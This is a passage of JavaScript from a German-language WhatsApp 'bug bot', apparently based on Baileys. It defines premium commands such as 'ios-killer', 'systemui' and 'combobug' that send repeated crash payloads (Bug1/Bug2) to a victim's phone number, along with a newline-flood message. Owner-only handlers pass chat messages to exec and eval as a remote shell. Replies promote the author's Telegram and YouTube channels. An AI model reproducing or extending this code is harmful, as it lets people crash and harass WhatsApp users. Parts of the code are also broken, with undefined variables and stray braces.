Dantzyy.sendMessage(id, {text: `klarer Fehler von Dantzy\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Dantzy hat den Fehler behoben")
}
break 
case 'iossturztab': case "ios-killer": case "systemui": case "dokumentationen": case "verzogerung": {
if (!isPremium) return reply("Sie haben keinen Zugriff")
if (!q) return reply(`Beispiele:\n ${prefix + command} 49×××|5`)
victim = qtext.split("|")[0]
jumlah = qtext.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < jumlah; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
𝗔𝗺𝗼𝘂𝗻𝘁 = ${jumlah}
`)
}
break

case 'hard': {
if (!isPremium) return reply(`Sie haben keinen Zugriff`)
reply("‼️Prozess")
jumlah = 10
await Bug1(target, Ptcp = true)
await Bug1(target, Ptcp = true)
await Bug1(target, Ptcp = true)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
break

case 'combobug': {
if (!isPremium) return reply("Du hast keinen Zugriff")
if (!q) return reply(`Beispiel: ${prefix + command} 49×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("‼️Prozess")
for (let i = 0; i < 10; i++) {
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
await Bug1(target, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
}
break

case 'system': {
if (!isPremium) return reply(`Sie haben keinen Zugriff`)
reply("‼️Prozess")
jumlah = 10
await Bug2(target, Null, Ptcp = true)
await Bug2(target, Null)
}
reply(`
‼️Erfolg
Telegramm = t.me/Danzxtzy
Abonniere mein YouTube = https://www.youtube.com/@Danzxtzy
`)
break

default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Dantzyy.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Dantzyy.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Dantzyy.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Dantzyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Dantzyy.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Dantzyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
Dantzyy.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})